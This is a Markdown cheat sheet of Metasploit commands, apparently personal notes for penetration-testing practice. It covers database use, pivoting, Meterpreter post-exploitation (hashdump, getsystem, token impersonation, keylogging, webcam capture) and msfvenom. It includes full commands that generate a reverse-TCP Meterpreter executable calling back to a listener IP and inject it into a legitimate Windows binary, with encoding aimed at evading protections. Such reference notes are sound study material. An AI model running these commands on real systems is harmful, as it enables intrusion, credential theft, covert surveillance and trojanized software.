# Metasploit

## Using the database

1. Start/enable postgresql service.
2. `sudo msfdb init`

Run help and check for db commands.

**Most common**

```
db_status
db_import FILENAME
db_export -f xml PATH
```

### Workspaces

To keep track of findings, msf can store it in database. To keep it clean and organized you can separate the data with workspaces.

```
workspace
workspace -a NEW_WORKSPACE
workspace -d DELETE_WORKSPACE_NAME
```

### List organized data from database

**hosts**

```
hosts -h
hosts IP
hosts IP -c address,name
hosts IP -n NEW_NAME | -m COMMENT | -t TAG
hosts -a NEW_HOST | -d DELETE_HOST

# Set RHOSTS from hosts
hosts -S SEARCH_OPTION -R

# Show hosts that are up
hosts -u
```

**services**

```
services -h
services -p PORT_NUMBER

# Auto-add to RHOSTS
services -p PORT_NUMBER --rhosts
```

**creds**

```
creds -h
```

**vulns**

Lists all detected vulnerabilities found.

## msfconsole

To start msfconsole with a script of commands:

```
msfconsole -r my-setup.rc
```

**General**
```
help

# Show command help
ANY_COMMAND -h

show CATEGORY

search KEYWORD
search type:auxilliary KEYWORD
use EXPLOIT_NAME/ID

# Sets RHOSTS globally
setg RHOSTS IP

# Job control
jobs
kill [id]
```

**Sessions**

```
# Background session
# CTRL+Z or command background from meterpreter
# List and connect to session
sessions -l
sessions 1
# Try to upgrade shell to meterpreter
sessions -u SESSION_ID
```

**Inside a module**

```
back
previous

show info | info
show options
show advanced
show payloads
show targets
set | unset OPTION VALUE
set target

check
run | exploit

# Run in background
run -j | exploit -j

# You can set your local host(LHOST) to an interface instead of IP:
set LHOST tun0

# Go inside a payload module to generate one, like msfvenom.
generate -f FORMAT -e ENCODING -o FILEPATH
```

## Port Forwarding/SOCKS/Tunneling/Routes

**Manually adding routes**

*Useful to conduct portscans, one-way connections and/or bind shells.*

```
route add NETWORK SESSION
route print
```

**Autoroute module**

`exploit/multi/manage/autoroute`

Can automaticaly add routes to found networks on target. Set session and go.

**SOCKS Proxy**

`auxiliary/server/socks_proxy`

Set host and port.

**Meterpreter port forwarding**

Inside a meterpreter, run the `portfwd` command.

```
portfwd -h
portfwd add -l LOCAL_PORT -p RELAY_TO_PORT -r TARGET_IP
```


## Modules

- Default location of modules is `/usr/share/metasploit-framework/modules/`.
- If you build your own modules you can put them in `~/.msf4/modules/`.
- Reload modules from all paths with `reload_all`.
- You can also use the `loadpath`command to load from specific path.
- For simple portscanners, search for **portscan**.
- To provide a connection into the framework for actions not triggered by it, like a meterpreter executable or script, use **exploit/multi/handler**.

### Nmap and metasploit

To run nmap and automatically store results in database, use `db_nmap` inside msfconsole.

To import nmap results, import the xml output file with the `db_import FILE` command.

## Meterpreter and other payloads

**General**

```
help
shell
execute -f FILE -a ARGS
ps, kill
ipconfig
resource
search
```

**Other**

```
# Migrate to another process
migrate

# Attempts to privesc to SYSTEM
getsystem

# Dump all hashes in SAM
hashdump
```

**Enumeration**

```
getuid
sysinfo
```

**File management**

```
upload/download
pwd, ls, cd, cat
lpwd, lcd# Routing
edit
```

**Channels**

To spawn multiple shells inside a merp, we can use channels, similiar to sessions.

```
# CTRL+Z to background
channel -l
channel -i 2
```

**"Spying" on user**

There are multiple ways of intruding into a users session, example are keyloggers, printscreen tools or using their webcam. Normally you have to be in users context to access these by migrating to another process.

```
keyscan_start
keyscan_dump
keyscan_stop

webcam_list
webcam_stream

screenshare
screenshot

```

**Changing transport protocols on an existing connection**

```
transport list
transport add -t TYPE -l LOCAL_IP -p LOCAL_PORT
# Set up listener
# Activate next transport, will close existing.
transport next
```

**Modules**

The merp can be extended with various models.

*Powershell*

```
load powershell
powershell_shell
```

*Python*

```
load python
python_execute "PYTHON CODE"
python_import -f FILE
```

*kiwi*

Is mimikatz.

*Incognito*

```
use incognito
list_tokens -g
impersonate_token
```

### Other payloads

There are both staged and unstages payloads, differentiated by a forward slash in the name, eg shell_reverse_tcp(unstaged) or shell/reverse_tcp(staged).

## msfvenom

**Basics**

```
msfvenom -l [payloads | encoders | formats]
msfvenom -p [somepayload] --list-options

-p PAYLOAD
-f FORMAT
-E ENCODING
-i ENCODING iterations
-o OUTPUT FILENAME

# Examples
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.8.210.115 RPORT=1313 -e x86/shikata_ga_nai -f exe -o upload/merp.exe
```

**PE Injection**

Is done with the -x flag.

```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.8.210.115 RPORT=1313 -e x86/shikata_ga_nai -f exe -x /windows/binary.exe -o upload/merp.exe
```

**Advanced options from multi/handler**

When setting up a listener with multi/handler, we can also choose to encode the staged part, which might help evade some protections. We can list the options with `show advanced` command. We have to set 'EnableStageEncoding' and 'StageEncoder'.

We can also include autorun scripts with the 'AutoRun' option, eg gather scripts for enumeration.
